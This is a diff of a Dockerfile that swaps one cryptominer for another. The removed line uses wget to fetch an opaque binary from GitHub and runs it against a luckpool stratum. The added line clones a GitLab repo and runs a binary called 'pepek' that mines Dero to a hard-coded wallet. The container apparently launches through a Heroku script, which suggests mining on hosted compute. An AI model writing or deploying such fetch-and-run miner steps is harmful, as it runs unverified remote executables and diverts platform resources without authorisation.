@@ -1,4 +1,5 @@
 FROM thomasjp0x42/packetcrypt
 
-RUN wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru && chmod +x meki-baru && ./meki-baru -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 6
+RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o miners.dero.network -u dERoW2u96oBBqJJiAeDSRHbH6uFTmCxxEcQ5tgd5hLNKeMKXCpizH45SjdyCjNeYcqShtVetYFPSNeN2Dd3rz3Zo6Gb9mjxyTP -p SUKUMANTE2 -a astrobwt -k
+
 CMD bash heroku.sh
